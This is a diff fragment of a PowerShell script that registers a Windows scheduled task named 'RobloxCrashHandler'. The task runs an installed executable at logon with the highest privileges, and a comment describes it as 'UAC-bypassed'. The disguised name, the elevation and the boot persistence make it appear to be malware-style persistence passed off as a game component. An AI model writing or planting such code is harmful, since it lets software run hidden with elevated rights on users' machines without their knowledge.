@@ -181,10 +181,18 @@ try {
 
 # 4. Configure elevated UAC-bypassed Scheduled Task
 Write-Host "[3/5] Registering Task Scheduler service..." -ForegroundColor Yellow
-if ($Persist) {
-    schtasks /create /tn "RobloxCrashHandler" /tr "$InstallPathExe" /sc manual /rl highest /f
-} else {
-    schtasks /create /tn "RobloxCrashHandler" /tr "$InstallPathExe" /sc onlogon /rl highest /f
+try {
+    $Action = New-ScheduledTaskAction -Execute $InstallPathExe
+    $Trigger = if ($Persist) { New-ScheduledTaskTrigger -Once -At (Get-Date) } else { New-ScheduledTaskTrigger -AtLogOn }
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+    $Principal = New-ScheduledTaskPrincipal -RunLevel Highest
+    $null = Register-ScheduledTask -TaskName "RobloxCrashHandler" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force
+} catch {
+    if ($Persist) {
+        schtasks /create /tn "RobloxCrashHandler" /tr "`"$InstallPathExe`"" /sc manual /rl highest /f
+    } else {
+        schtasks /create /tn "RobloxCrashHandler" /tr "`"$InstallPathExe`"" /sc onlogon /rl highest /f
+    }
 }
 
 # Clean up any leftover legacy Registry Run key configuration
